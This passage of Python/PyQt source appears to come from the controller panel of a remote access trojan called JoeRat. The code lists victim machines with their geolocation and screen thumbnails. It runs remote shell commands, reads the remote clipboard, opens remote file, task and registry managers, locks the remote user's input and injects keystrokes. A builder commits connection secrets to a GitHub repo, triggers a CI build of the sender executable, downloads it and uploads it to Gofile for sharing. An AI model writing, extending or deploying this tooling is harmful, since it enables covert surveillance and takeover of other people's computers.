            return self._flag_pixmaps[cc]
        # Kick off background fetch (only once per cc)
        if not hasattr(self, '_flag_loading'):
            self._flag_loading: set = set()
        if cc not in self._flag_loading:
            self._flag_loading.add(cc)
            asyncio.ensure_future(self._load_flag_image(cc))
        return None

    async def _load_flag_image(self, cc: str):
        """Fetch flag PNG from flagcdn.com in a thread and cache as QPixmap."""
        import urllib.request
        url = f'https://flagcdn.com/w20/{cc.lower()}.png'
        loop = asyncio.get_event_loop()
        try:
            def _fetch():
                with urllib.request.urlopen(url, timeout=5) as r:
                    return r.read()
            data = await loop.run_in_executor(None, _fetch)
            pm = QPixmap()
            pm.loadFromData(data)
            if not pm.isNull():
                self._flag_pixmaps[cc] = pm
                QTimer.singleShot(0, self._rebuild_thumbnail_grid)
        except Exception:
            self._flag_pixmaps[cc] = QPixmap()  # cache empty to stop retrying
        finally:
            if hasattr(self, '_flag_loading'):
                self._flag_loading.discard(cc)

    def _get_machine_display_string(self, machine_id):
        info = self._machine_info.get(machine_id) or {}
        cc = str(info.get('countryCode') or '')
        if cc:
            return f'[{cc}] {machine_id}'
        return machine_id

    def get_active_stream_label(self):
        label = self.stream_label
        if hasattr(self, 'fullscreen_stream_label') and self.fullscreen_stream_label is not None and self.fullscreen_btn.isChecked():
            label = self.fullscreen_stream_label
        if not label.hasFocus():
            label.setFocus()
        return label

    def _update_machine_count(self):
        """Update the machine count label."""
        count = self.sender_list.count()
        self.machine_count_label.setText(f'{count} machine{"s" if count != 1 else ""}')

    def _rebuild_thumbnail_grid(self):
        if not hasattr(self, 'monitor_grid_widget'):
            return

        self.monitor_grid_widget.clear()
        self.monitor_list_widget.clear()
        self._thumbnail_labels.clear()

        machines = [self.sender_list.itemData(i, Qt.UserRole) for i in range(self.sender_list.count())]
        for i, mid in enumerate(machines):
            if not mid:
                continue

            # Create thumbnail for grid view
            card = QWidget()
            card.setFixedSize(210, 140)
            card.setStyleSheet(
                'QWidget { background: #1e1f2a; border: 1px solid #3a3c4e; border-radius: 8px; }'
                'QWidget:hover { border: 1px solid #5865F2; }'
            )
            card_layout = QVBoxLayout(card)
            card_layout.setContentsMargins(4, 4, 4, 6)
            card_layout.setSpacing(4)

            # Screen thumbnail label
            lbl = QLabel()
            lbl.setAlignment(Qt.AlignCenter)
            lbl.setFixedSize(200, 113)
            lbl.setText('⏳')
            lbl.setStyleSheet(
                'background: #12131a; color: #5865F2; border: none; border-radius: 5px;'
                'font-size: 22pt;'
            )
            lbl.setContextMenuPolicy(Qt.CustomContextMenu)
            lbl.customContextMenuRequested.connect(lambda pos, l=lbl: self._show_thumbnail_menu(pos, l))
            
            # Initialize thumbnail structure for this machine
            self._thumbnail_labels[mid] = {'grid': lbl, 'list': None}
            card_layout.addWidget(lbl)

            # Name row: flag image (fetched from flagcdn.com) + machine name
            _geo = self._machine_info.get(mid) or {}
            _cc = str(_geo.get('countryCode') or '')
            _city = str(_geo.get('city') or '')
            _country_name = str(_geo.get('country') or '')

            name_row = QWidget()
            name_row.setStyleSheet('background: transparent; border: none;')
            name_row_layout = QHBoxLayout(name_row)
            name_row_layout.setContentsMargins(2, 0, 2, 0)
            name_row_layout.setSpacing(4)

            if _cc:
                flag_pm = self._get_flag_pixmap(_cc)
                flag_lbl = QLabel()
                flag_lbl.setStyleSheet('background: transparent; border: none;')
                if flag_pm and not flag_pm.isNull():
                    flag_lbl.setFixedSize(20, 14)
                    flag_lbl.setPixmap(flag_pm.scaled(20, 14, Qt.KeepAspectRatio, Qt.SmoothTransformation))
                else:
                    flag_lbl.setText(_cc)
                    flag_lbl.setStyleSheet(
                        'color: #818cf8; font-size: 7pt; font-weight: bold;'
                        'background: #2a2b3d; border: 1px solid #3a3c4e; border-radius: 2px;'
                        'padding: 0 2px;'
                    )
                    flag_lbl.setFixedSize(24, 14)
                if _city:
                    flag_lbl.setToolTip(f'{_city}, {_country_name}')
                name_row_layout.addWidget(flag_lbl)

            name_lbl = QLabel(mid)
            name_lbl.setAlignment(Qt.AlignLeft | Qt.AlignVCenter)
            name_lbl.setStyleSheet('color: #9a9cb0; font-size: 8pt; background: transparent; border: none;')
            name_lbl.setWordWrap(False)
            avail = 168 if _cc else 196
            font_metrics = name_lbl.fontMetrics()
            elided = font_metrics.elidedText(mid, Qt.ElideMiddle, avail)
            name_lbl.setText(elided)
            name_row_layout.addWidget(name_lbl, 1)
            name_row_layout.addStretch()
            card_layout.addWidget(name_row)

            # Add to grid
            item = QListWidgetItem()
            item.setSizeHint(card.sizeHint())
            self.monitor_grid_widget.addItem(item)
            self.monitor_grid_widget.setItemWidget(item, card)

            # Create list item for list view
            list_item = QListWidgetItem()
            list_item.setData(Qt.UserRole, mid)
            list_item.setSizeHint(QSize(400, 70))  # Fixed size for consistency
            
            # Create custom widget for list item
            list_widget = QWidget()
            list_widget.setFixedHeight(70)
            list_widget.setStyleSheet('''
                QWidget {
                    background: #1e1f2a;
                    border: 1px solid #2e3040;
                    border-radius: 6px;
                    margin: 2px;
                }
                QWidget:hover {
                    background: #2a2b3d;
                    border-color: #5865F2;
                }
            ''')
            
            list_layout = QHBoxLayout(list_widget)
            list_layout.setContentsMargins(12, 8, 12, 8)
            list_layout.setSpacing(12)
            
            # Thumbnail for list
            list_thumb = QLabel()
            list_thumb.setFixedSize(100, 56)
            list_thumb.setText('⏳')
            list_thumb.setAlignment(Qt.AlignCenter)
            list_thumb.setStyleSheet('''
                background: #12131a;
                color: #5865F2;
                border: 1px solid #2e3040;
                border-radius: 4px;
                font-size: 16pt;
            ''')
            list_thumb.setContextMenuPolicy(Qt.CustomContextMenu)
            list_thumb.customContextMenuRequested.connect(lambda pos, l=list_thumb: self._show_thumbnail_menu(pos, l))
            # Store reference for updates
            self._thumbnail_labels[mid]['list'] = list_thumb
            
            list_layout.addWidget(list_thumb)
            
            # Machine info for list
            info_layout = QVBoxLayout()
            info_layout.setSpacing(4)
            info_layout.setContentsMargins(0, 0, 0, 0)
            
            # Machine name with flag
            name_info_layout = QHBoxLayout()
            name_info_layout.setSpacing(6)
            
            if _cc:
                flag_pm = self._get_flag_pixmap(_cc)
                list_flag_lbl = QLabel()
                list_flag_lbl.setStyleSheet('background: transparent; border: none;')
                if flag_pm and not flag_pm.isNull():
                    list_flag_lbl.setFixedSize(20, 14)
                    list_flag_lbl.setPixmap(flag_pm.scaled(20, 14, Qt.KeepAspectRatio, Qt.SmoothTransformation))
                else:
                    list_flag_lbl.setText(_cc)
                    list_flag_lbl.setStyleSheet('''
                        color: #818cf8;
                        font-size: 7pt;
                        font-weight: bold;
                        background: #2a2b3d;
                        border: 1px solid #3a3c4e;
                        border-radius: 2px;
                        padding: 0 2px;
                    ''')
                    list_flag_lbl.setFixedSize(24, 14)
                name_info_layout.addWidget(list_flag_lbl)
            
            list_name_lbl = QLabel(mid)
            list_name_lbl.setStyleSheet('''
                color: #e8e9f5;
                font-size: 12pt;
                font-weight: bold;
                background: transparent;
                border: none;
            ''')
            name_info_layout.addWidget(list_name_lbl)
            name_info_layout.addStretch()
            
            info_layout.addLayout(name_info_layout)
            
            # Location info
            if _city:
                location_lbl = QLabel(f'📍 {_city}, {_country_name}')
                location_lbl.setStyleSheet('''
                    color: #686a80;
                    font-size: 9pt;
                    background: transparent;
                    border: none;
                ''')
                info_layout.addWidget(location_lbl)
            else:
                # Show country if no city
                if _country_name:
                    location_lbl = QLabel(f'🌍 {_country_name}')
                    location_lbl.setStyleSheet('''
                        color: #686a80;
                        font-size: 9pt;
                        background: transparent;
                        border: none;
                    ''')
                    info_layout.addWidget(location_lbl)
            
            list_layout.addLayout(info_layout)
            list_layout.addStretch()
            
            # Add status indicator
            status_indicator = QLabel('●')
            status_indicator.setStyleSheet('''
                color: #4ade80;
                font-size: 10pt;
                background: transparent;
                border: none;
            ''')
            status_indicator.setToolTip('Online')
            list_layout.addWidget(status_indicator)
            
            self.monitor_list_widget.addItem(list_item)
            self.monitor_list_widget.setItemWidget(list_item, list_widget)

        if not machines:
            # Grid placeholder
            placeholder = QLabel('No machines connected')
            placeholder.setAlignment(Qt.AlignCenter)
            placeholder.setStyleSheet('color: #686a80; font-style: italic; font-size: 11pt;')
            item = QListWidgetItem()
            item.setSizeHint(QSize(220, 60))
            self.monitor_grid_widget.addItem(item)
            self.monitor_grid_widget.setItemWidget(item, placeholder)
            
            # List placeholder
            list_placeholder = QListWidgetItem('No machines connected')
            list_placeholder.setData(Qt.UserRole, None)
            self.monitor_list_widget.addItem(list_placeholder)

        # Update machine count
        self._update_machine_count()

    def _show_thumbnail_menu(self, pos, label):
        # Look up machine_id from the actual widget that was right-clicked (avoids lambda capture bugs)
        machine_id = None
        for mid, widgets in self._thumbnail_labels.items():
            if isinstance(widgets, dict):
                # New structure with separate grid/list widgets
                if widgets.get('grid') is label or widgets.get('list') is label:
                    machine_id = mid
                    break
            else:
                # Old structure (single widget)
                if widgets is label:
                    machine_id = mid
                    break
        if machine_id is None:
            return
        menu = QMenu(self)
        act = menu.addAction('View full screen')
        act.triggered.connect(lambda checked, mid=machine_id: self._switch_to_full_view(mid))
        # Use cursor position so menu appears where user right-clicked (fixes multi-monitor)
        menu.exec_(QCursor.pos())

    def _animate_view_transition(self, target_index, on_finished=None):
        """Animate a fade-out / switch / fade-in transition on monitor_wall_stack."""
        stack = self.monitor_wall_stack
        current_widget = stack.currentWidget()
        if current_widget is None:
            stack.setCurrentIndex(target_index)
            if on_finished:
                on_finished()
            return

        # Create opacity effect for fade-out on current widget
        fade_effect = QGraphicsOpacityEffect(current_widget)
        current_widget.setGraphicsEffect(fade_effect)
        fade_effect.setOpacity(1.0)

        fade_out = QPropertyAnimation(fade_effect, b'opacity')
        fade_out.setDuration(150)
        fade_out.setStartValue(1.0)
        fade_out.setEndValue(0.0)
        fade_out.setEasingCurve(QEasingCurve.InQuad)

        def _on_fade_out_done():
            # Remove effect from old widget
            current_widget.setGraphicsEffect(None)
            # Switch page
            stack.setCurrentIndex(target_index)
            # Fade-in the new widget
            new_widget = stack.currentWidget()
            if new_widget is None:
                if on_finished:
                    on_finished()
                return
            fade_in_effect = QGraphicsOpacityEffect(new_widget)
            new_widget.setGraphicsEffect(fade_in_effect)
            fade_in_effect.setOpacity(0.0)

            fade_in = QPropertyAnimation(fade_in_effect, b'opacity')
            fade_in.setDuration(200)
            fade_in.setStartValue(0.0)
            fade_in.setEndValue(1.0)
            fade_in.setEasingCurve(QEasingCurve.OutQuad)

            def _on_fade_in_done():
                new_widget.setGraphicsEffect(None)
                if on_finished:
                    on_finished()

            fade_in.finished.connect(_on_fade_in_done)
            # Keep reference so animation isn't garbage-collected
            self._view_fade_in_anim = fade_in
            self._view_fade_in_effect = fade_in_effect
            fade_in.start()

        fade_out.finished.connect(_on_fade_out_done)
        # Keep reference so animation isn't garbage-collected
        self._view_fade_out_anim = fade_out
        self._view_fade_out_effect = fade_effect
        fade_out.start()

    def _switch_to_full_view(self, machine_id):
        self.selected_sender = machine_id
        self.selected_sender_label.setText(f'Current sender: {machine_id}')
        self.sender_list.blockSignals(True)
        self.sender_list.setCurrentText(machine_id)
        self.sender_list.blockSignals(False)
        self._subscribe_all = False
        self._full_view_mode = True
        self.current_view_mode = 'full'
        self.target_machine_id = machine_id
        self.update_telemetry_panel()
        asyncio.ensure_future(self.send_ws({'type': 'set-subscribe-all', 'enabled': False}))
        asyncio.ensure_future(self.send_ws({'type': 'select_sender', 'sender': machine_id}))
        self._animate_view_transition(2)  # Index 2 is the full view widget
        self._send_stream_quality_for_sender(machine_id)

    def _on_machine_detail_click(self, item):
        actual_machine_id = item.data(Qt.UserRole)
        if not actual_machine_id: 
            return
        self._selected_detail_machine = actual_machine_id
        
        self.machine_detail_label.setText(f'Machine: {actual_machine_id}')
        info = self._machine_info.get(actual_machine_id, {})
        
        self.machine_telemetry_display.update_data(info)
        
        self.machine_notes_input.blockSignals(True)
        self.machine_notes_input.setPlainText(self._load_machine_notes(actual_machine_id))
        self.machine_notes_input.blockSignals(False)

    def _load_machine_notes(self, machine_id):
        try:
            if os.path.exists(self._machine_notes_path):
                with open(self._machine_notes_path, 'r') as f:
                    data = json.load(f)
                    return data.get(machine_id, '')
        except Exception:
            pass
        return ''

    def _save_machine_notes(self):
        if not self._selected_detail_machine:
            return
        try:
            data = {}
            if os.path.exists(self._machine_notes_path):
                with open(self._machine_notes_path, 'r') as f:
                    data = json.load(f)
            # pyre-ignore[16]
            data[self._selected_detail_machine] = self.machine_notes_input.toPlainText()
            with open(self._machine_notes_path, 'w') as f:
                json.dump(data, f, indent=2)
        except Exception:
            pass

    def run_remote_command(self):
        cmd = self.shell_command_input.text().strip()
        if not cmd or not self.selected_sender:
            self.show_warning('Select a sender and enter a command.')
            return
        req_id = str(uuid.uuid4())
        self._pending_command_request = req_id
        asyncio.ensure_future(self.send_ws({
            'type': 'remote-control', 'action': 'execute-command',
            'machineId': self.selected_sender, 'command': cmd, 'requestId': req_id
        }))
        self.shell_output.append(f'$ {cmd}\n(running...)')

    def get_remote_clipboard(self):
        if not self.selected_sender:
            self.show_warning('Select a sender first.')
            return
        req_id = str(uuid.uuid4())
        self._pending_clipboard_request = req_id
        asyncio.ensure_future(self.send_ws({
            'type': 'remote-control', 'action': 'clipboard-get',
            'machineId': self.selected_sender, 'requestId': req_id
        }))

    def open_file_manager(self):
        if not hasattr(self, 'file_manager_window') or self.file_manager_window is None:
            self.file_manager_window = FileManagerWindow(self)
        self.file_manager_window.show()
        self.file_manager_window.raise_()

    def open_task_manager(self):
        if not hasattr(self, 'task_manager_window') or self.task_manager_window is None:
            self.task_manager_window = TaskManagerWindow(self)
        self.task_manager_window.show()
        self.task_manager_window.raise_()

    def open_registry_editor(self):
        try:
            print('[DEBUG] Opening Registry Editor...')
            
            if not hasattr(self, 'registry_editor_window') or self.registry_editor_window is None:
                print('[DEBUG] Creating new RegistryEditorWindow instance...')
                self.registry_editor_window = RegistryEditorWindow(self)
                print('[DEBUG] RegistryEditorWindow created successfully')
            print('[DEBUG] Showing window...')
            self.registry_editor_window.show()
            self.registry_editor_window.raise_()
            print('[DEBUG] Registry Editor opened successfully')
        except Exception as e:
            print(f'[ERROR] Failed to open Registry Editor: {e}')
            import traceback
            traceback.print_exc()
            self.show_warning(f'Failed to open Registry Editor: {e}')

    def open_build_sender_dialog(self):
        """Open a dialog that runs dotnet publish on the C# sender project."""
        cwd = os.path.normpath(os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            '..', 'csharpsender', 'CSharpSender'
        ))
        if not os.path.isdir(cwd):
            self.show_warning(f'Sender project not found: {cwd}')
            return
        dlg = BuildOutputDialog(
            self,
            title='Build C# Sender — dotnet publish',
            cwd=cwd,
            script_path='dotnet publish'
        )
        dlg.exec_()

    def log_build_msg(self, msg: str):
        if hasattr(self, 'build_log_output'):
            self.build_log_output.append(f"[{time.strftime('%H:%M:%S')}] {msg}")

    def open_github_build_dialog(self):
        """Commit BuildConfig.cs to GitHub using hardcoded repo and token."""
        self._save_github_settings()
        cfg    = self._load_github_build_config()
        
        # --- HARDCODED CREDENTIALS ---
        repo   = "Lonhaax/JoeRat"
        pat    = "YOUR_GITHUB_TOKEN_HERE" # <--- Replace with real token
        # -----------------------------

        exe_name = getattr(self, 'gh_exe_name_input', None) and self.gh_exe_name_input.text().strip() or cfg.get('exe_name', 'CSharpSender').strip()
        
        if hasattr(self, 'build_log_output'):
            self.build_log_output.clear()

        if not pat or "github_pat_" not in pat:
             self.log_build_msg('❌ ERROR: Please insert the real GitHub PAT in viewer.py.')
             return

        self.log_build_msg(f'🚀 Starting build process for: {exe_name}.exe')
        asyncio.ensure_future(self._trigger_github_build(repo, pat, exe_name))

    def _load_github_build_config(self):
        """Load GitHub build config from viewer_config.json."""
        try:
            if os.path.exists(self._viewer_config_path):
                with open(self._viewer_config_path, 'r') as f:
                    return json.load(f).get('github', {})
        except Exception:
            pass
        return {}

    def _save_github_settings(self):
        """Persist GitHub build settings from the Settings tab."""
        try:
            cfg = {}
            if os.path.exists(self._viewer_config_path):
                with open(self._viewer_config_path, 'r') as f:
                    cfg = json.load(f)
            old = cfg.get('github', {})
            cfg['github'] = {
                'exe_name': (getattr(self, 'gh_exe_name_input', None) and self.gh_exe_name_input.text().strip()) or old.get('exe_name', 'JoeRat'),
            }
            with open(self._viewer_config_path, 'w') as f:
                json.dump(cfg, f, indent=2)
            self.show_warning('Build settings saved.')
        except Exception:
            pass

    async def _trigger_github_build(self, repo: str, pat: str, exe_name: str):
        """Create unique branch, commit config, wait for release, download, and upload to Gofile."""
        import urllib.request, urllib.error, base64 as _b64, time, os, requests

        def _req(url, method='GET', body=None):
            r = urllib.request.Request(url, data=body, method=method)
            r.add_header('Authorization', f'Bearer {pat}')
            r.add_header('Accept', 'application/vnd.github+json')
            r.add_header('X-GitHub-Api-Version', '2022-11-28')
            if body:
                r.add_header('Content-Type', 'application/json')
            with urllib.request.urlopen(r, timeout=15) as resp:
                return json.loads(resp.read())

        loop = asyncio.get_event_loop()
        try:
            timestamp = time.strftime('%Y%m%d-%H%M')
            branch = f"build/{exe_name}-{timestamp}"
            
            self.log_build_msg(f' ℹ️  Fetching repository information...')
            # Fetch master branch SHA
            main_ref = await loop.run_in_executor(
                None, lambda: _req(f'https://api.github.com/repos/{repo}/git/ref/heads/master')
            )
            sha = main_ref['object']['sha']
            
            self.log_build_msg(f'🌿 Creating isolated branch: {branch}...')
            # Create new branch
            await loop.run_in_executor(
                None, lambda: _req(
                    f'https://api.github.com/repos/{repo}/git/refs',
                    method='POST',
                    body=json.dumps({"ref": f"refs/heads/{branch}", "sha": sha}).encode()
                )
            )

            # Build the new BuildConfig.cs
            new_content = (
                'namespace JoeRat;\n'
                'internal static class BuildConfig\n'
                '{\n'
                f'    public const string DefaultWsUrl  = "{self.ws_url}";\n'
                f'    public const string DefaultRoomId = "{self.room_id}";\n'
                f'    public const string DefaultSecret = "{self.secret}";\n'
                f'    public const string ExeName       = "{exe_name}";\n'
                '}\n'
            )
            encoded = _b64.b64encode(new_content.encode()).decode()

            self.log_build_msg(f'📝 Committing new settings securely to {branch}...')
            # Commit the updated file — push triggers workflow
            file_path = 'csharpsender/CSharpSender/BuildConfig.cs'
            api_file  = f'https://api.github.com/repos/{repo}/contents/{file_path}'
            # Fetch the sha of the old file from the new branch just in case
            current   = await loop.run_in_executor(
                None, lambda: _req(f'{api_file}?ref={branch}')
            )
            current_sha = current.get('sha', '')

            await loop.run_in_executor(
                None, lambda: _req(
                    api_file, method='PUT',
                    body=json.dumps({
                        'message': f'chore: release {exe_name} for room {self.room_id}',
                        'content': encoded,
                        'sha':     current_sha,
                        'branch':  branch,
                    }).encode()
                )
            )

            self.log_build_msg('✅ Code has been accepted on the server... Processing build...')
            self.log_build_msg('⏳ Waiting for executable to finish building. This usually takes a few minutes. Do not close this window or trigger another build until this one finishes.')

            asyncio.ensure_future(self._poll_and_download_release(repo, pat, branch, exe_name))

        except urllib.error.HTTPError as e:
            body_txt = e.read().decode(errors='replace')[:300]
            msg = f'GitHub error {e.code}: {body_txt}'
            self.log_build_msg(f'❌ {msg}')
        except Exception as e:
            self.log_build_msg(f'❌ Error triggering build: {str(e)}')

    async def _poll_and_download_release(self, repo, pat, tag, exe_name):
        import urllib.request, time, os, requests
        def _req(url):
            r = urllib.request.Request(url)
            r.add_header('Authorization', f'Bearer {pat}')
            r.add_header('Accept', 'application/vnd.github+json')
            r.add_header('X-GitHub-Api-Version', '2022-11-28')
            with urllib.request.urlopen(r, timeout=15) as resp:
                return json.loads(resp.read())
        
        loop = asyncio.get_event_loop()
        asset_url = None
        for i in range(40): # poll for 10 minutes
            await asyncio.sleep(15)
            self.log_build_msg(f'   Checking server... (Attempt {i+1}/40) Do not close this window. You will not receive the file.')
            try:
                release = await loop.run_in_executor(
                    None, lambda: _req(f'https://api.github.com/repos/{repo}/releases/tags/{tag}')
                )
                if release and release.get('assets'):
                    asset_url = release['assets'][0]['url']
                    self.log_build_msg(f'✅ Found compiled file on GitHub server!')
                    break
            except urllib.error.HTTPError as e:
                pass
            except Exception:
                pass
                
        if not asset_url:
            self.log_build_msg("❌ Build timeout. The server took too long to compile the file.")
            QTimer.singleShot(0, lambda: self.show_warning("❌ Build timeout. Could not find release asset."))
            return
            
        try:
            self.log_build_msg(f"⬇️ Downloading {exe_name}.exe to your machine...")
            
            user_downloads = os.path.join(os.path.expanduser('~'), 'Downloads')
            save_path = os.path.normpath(os.path.join(user_downloads, f"{exe_name}.exe"))
            
            def _download():
                r = urllib.request.Request(asset_url)
                r.add_header('Authorization', f'Bearer {pat}')
                r.add_header('Accept', 'application/octet-stream')
                r.add_header('X-GitHub-Api-Version', '2022-11-28')
                with urllib.request.urlopen(r, timeout=60) as resp, open(save_path, 'wb') as f:
                    f.write(resp.read())
            
            await loop.run_in_executor(None, _download)
            self.log_build_msg(f"✅ Download complete! Saved to: {save_path}")
            self.log_build_msg(f"☁️ Uploading to Gofile... please wait.")
            
            def _upload_gofile():
                srv_resp = requests.get("https://api.gofile.io/servers").json()
                server = srv_resp['data']['servers'][0]['name']
                with open(save_path, 'rb') as f:
                    upload_resp = requests.post(f"https://{server}.gofile.io/contents/uploadfile", files={'file': f}).json()
                return upload_resp['data']['downloadPage']
                
            share_link = await loop.run_in_executor(None, _upload_gofile)
            
            self.log_build_msg(f"🎉 Build Flow Complete!")
            self.log_build_msg(f"🔗 Gofile Link: {share_link}")
            
            # Show the final dialog summary
            QTimer.singleShot(0, lambda: self.show_warning(f"🎉 Build Complete!\n\nDownloaded to:\n{save_path}\n\nGofile Link:\n{share_link}"))
            
        except Exception as e:
            self.log_build_msg(f"❌ Post-build failed: {str(e)}")



    def get_machine_id(self):
        return platform.node()

    def toggle_fullscreen(self):
        if self.fullscreen_btn.isChecked():
            # Create a new StreamLabel for fullscreen display
            self.fullscreen_stream_label = StreamLabel(self)
            self.fullscreen_stream_label.setAlignment(Qt.AlignCenter)
            self.fullscreen_stream_label.setFocusPolicy(Qt.StrongFocus)
            self.fullscreen_stream_label.setMouseTracking(True)
            # Copy pixmap from original stream_label
            pixmap = self.stream_label.pixmap()
            if pixmap:
                self.fullscreen_stream_label.setPixmap(pixmap)
            self.fullscreen_stream_label.setText(self.stream_label.text())
            # Connect event handlers for interactivity
            self.fullscreen_stream_label.mousePressEvent = self.handle_mouse_press
            self.fullscreen_stream_label.mouseReleaseEvent = self.handle_mouse_release
            self.fullscreen_stream_label.mouseMoveEvent = self.handle_mouse_move
            self.fullscreen_stream_label.wheelEvent = self.handle_mouse_wheel
            self.fullscreen_stream_label.keyPressEvent = self.handle_key_press
            self.fullscreen_stream_label.keyReleaseEvent = self.handle_key_release
            self.fullscreen_stream_label.enterEvent = self.handle_stream_enter
            # Also ensure original stream_label always has handlers and mouse tracking
            self.stream_label.setMouseTracking(True)
            self.stream_label.mousePressEvent = self.handle_mouse_press
            self.stream_label.mouseReleaseEvent = self.handle_mouse_release
            self.stream_label.mouseMoveEvent = self.handle_mouse_move
            self.stream_label.wheelEvent = self.handle_mouse_wheel
            self.stream_label.keyPressEvent = self.handle_key_press
            self.stream_label.keyReleaseEvent = self.handle_key_release
            self.stream_label.enterEvent = self.handle_stream_enter
            fullscreen_stack = QStackedWidget()
            fullscreen_widget = QWidget()
            layout = QGridLayout()
            layout.setContentsMargins(0, 0, 0, 0)
            # Set fullscreen background to black
            fullscreen_widget.setStyleSheet('background-color: #000;')
            
            # The StreamLabel natively handles scaling with Qt.KeepAspectRatio and SmoothTransformation in its resizeEvent.
            # Do NOT use setScaledContents(True) as it forces ignorant 100% width/height stretching.
            layout.addWidget(self.fullscreen_stream_label, 0, 0)
            
            # Show fullscreen button as floating overlay in fullscreen mode (QGridLayout allows z-stacking in the same cell)
            self.fullscreen_btn.setVisible(True)
            self.fullscreen_btn.setText('  Exit Fullscreen')
            self.fullscreen_btn.setStyleSheet('background: rgba(30, 30, 30, 180); color: #fff; border-radius: 8px; padding: 10px; font-size: 16px;')
            layout.addWidget(self.fullscreen_btn, 0, 0, Qt.AlignTop | Qt.AlignRight)
            
            fullscreen_widget.setLayout(layout)
            fullscreen_stack.addWidget(self.central_widget)
            fullscreen_stack.addWidget(fullscreen_widget)
            self.setCentralWidget(fullscreen_stack)
            fullscreen_stack.setCurrentIndex(1)
            self.fullscreen_stream_label.setFocus()
            self.showFullScreen()
            self._fullscreen_stack = fullscreen_stack
        else:
            # Restore original layout and widgets
            self.showNormal()
            # Recreate main UI tabs and layout
            self.setup_ui()
            self.setCentralWidget(self.central_widget)
            self.fullscreen_btn.setText('Fullscreen')
            self.fullscreen_btn.setVisible(True)
            # Remove reference to fullscreen_stack and fullscreen_stream_label
            if hasattr(self, '_fullscreen_stack'):
                self._fullscreen_stack = None
            if hasattr(self, 'fullscreen_stream_label'):
                self.fullscreen_stream_label.deleteLater()
                self.fullscreen_stream_label = None
            
            # Force reconnection to sender after UI is restored
            if self.selected_sender:
                QTimer.singleShot(1000, self._reconnect_to_sender)
    
    def _reconnect_to_sender(self):
        """Reconnect to the selected sender after fullscreen exit"""
        if self.selected_sender and hasattr(self, 'sender_list'):
            # Re-select the current sender to restart the stream
            current_index = self.sender_list.currentIndex()
            if current_index >= 0:
                # Simulate re-selecting the sender
                self.handle_sender_select(current_index)
    def update_telemetry_panel(self):
        info = {}
        if self.selected_sender and self.selected_sender in self._machine_info:
            info.update(self._machine_info[self.selected_sender])
        if isinstance(self.last_telemetry, dict):
            telemetry_data = self.last_telemetry.get('info', self.last_telemetry)
            if isinstance(telemetry_data, dict):
                info.update(telemetry_data)
        
        self.telemetry_panel.update_data(info)
    # Removed custom eventFilter and keyPressEvent override. Keyboard events handled by stream_label only.
    def send_key(self):
        key = self.key_input.text().strip()
        if not key:
            self.show_warning('Key input is empty.')
            return
        if not self.selected_sender:
            self.show_warning('Select a sender before sending key.')
            return
        payload = {
            'type': 'remote-control',
            'action': 'key-press',
            'key': key,
            'machineId': self.selected_sender
        }
        asyncio.ensure_future(self.send_ws(payload))
        self.key_input.clear()
        self.show_warning('Key sent.')
    def send_chat_message(self):
        message = self.chat_input.text().strip()
        if not message:
            self.show_warning('Chat message is empty.')
            return
        if not self.selected_sender:
            self.show_warning('Select a sender before sending chat.')
            return
        payload = {
            'type': 'chat',
            'user': 'viewer',
            'message': message,
            'machineId': self.selected_sender
        }
        asyncio.ensure_future(self.send_ws(payload))
        self.chat_log.addItem(f"viewer: {message}")
        self.chat_input.clear()
        self.show_warning('Chat message sent.')
    def __init__(self):
        # pyre-ignore[19]
        super().__init__()
        self.setWindowTitle('Monitor Viewer')
        self.resize(1600, 1000)  # Even larger window to fit full 1920x1080 images
        self.settings = QSettings('JakeCash', 'MonitorViewer')
        self.fullscreen_btn = QPushButton('  Fullscreen')
        self.fullscreen_btn.setCheckable(True)
        self.fullscreen_btn.setIcon(self.style().standardIcon(QStyle.SP_TitleBarMaxButton) if hasattr(QStyle, 'SP_TitleBarMaxButton') else QIcon())
        self.fullscreen_btn.setToolTip('Toggle fullscreen mode for the stream view')
        self.fullscreen_btn.clicked.connect(self.toggle_fullscreen)
        self.machine_id = self.get_machine_id()
        # Initialize all UI widgets
        self.clipboard_input = QLineEdit()
        self.clipboard_input.setPlaceholderText('Paste text to send to remote clipboard...')
        self.clipboard_send_btn = QPushButton('Send Clipboard')
        self.clipboard_send_btn.setToolTip('Send clipboard text to the selected remote machine')
        self.clipboard_send_btn.clicked.connect(self.send_clipboard_text)

        # Initialize widgets referenced in setup_ui and other methods
        self.sender_list = QComboBox()
        self.selected_sender_label = QLabel('No sender selected')
        self.status_label = QLabel('Disconnected')
        self.quality_combo = QComboBox()
        self.quality_combo.addItems(['Ultra (native)', 'Low (save bandwidth)', 'Medium', 'High (smooth)'])
        self.quality_combo.setCurrentIndex(0)  # Force Ultra (native)
        self._stream_quality = 'ultra'  # Force ultra quality
        self.quality_combo.setToolTip('Adjust stream quality — Ultra uses native resolution, others scale it down')
        self.quality_combo.currentIndexChanged.connect(self._on_quality_changed)
        self.lock_remote_check = QPushButton('Lock remote input')
        self.lock_remote_check.setCheckable(True)
        self.lock_remote_check.setToolTip('Lock/unlock keyboard and mouse input on the remote machine')
        self.lock_remote_check.clicked.connect(self._on_lock_remote_toggled)
        self.chat_log = QListWidget()
        self.chat_input = QLineEdit()
        self.chat_send = QPushButton('Send')
        self.remote_panel = self.create_remote_panel()
        self.telemetry_panel = TelemetryDashboard(self)
        self.telemetry_refresh_btn = QPushButton('Refresh Telemetry')
        self.telemetry_refresh_btn.setToolTip('Manually refresh telemetry data from the selected machine')
        self.telemetry_refresh_btn.clicked.connect(self.update_telemetry_panel)
        self.last_telemetry = None
        self.last_system_info = None
        self.stream_label = StreamLabel(self)
        self.stream_label.setAlignment(Qt.AlignCenter)
        self.stream_label.setText('Waiting for stream...')
        self.stream_label.setStyleSheet('color: #e0e0e0; background: #23242a; border-radius: 16px; font-family: Segoe UI, Arial, sans-serif; font-size: 18px; padding: 16px;')
        self.stream_label.setMinimumSize(1200, 675)  # Minimum size to fit 16:9 aspect ratio
        self.stream_label.clear()

        # Card-like styling for main widgets
        self.sender_list.setStyleSheet('QComboBox { border-radius: 8px; padding: 6px 12px; font-size: 14px; background: #1e1e1e; color: #e0e0e0; }')
        self.selected_sender_label.setStyleSheet('QLabel { font-size: 15px; color: #818cf8; font-weight: bold; padding: 6px 12px; border-radius: 8px; background: #181a24; }')
        self.status_label.setStyleSheet('QLabel { font-size: 14px; color: #4ade80; font-weight: bold; padding: 6px 12px; border-radius: 8px; background: #0f1c14; }')
        self.quality_combo.setStyleSheet('QComboBox { border-radius: 8px; padding: 6px 12px; font-size: 14px; background: #1e1e1e; color: #e0e0e0; }')
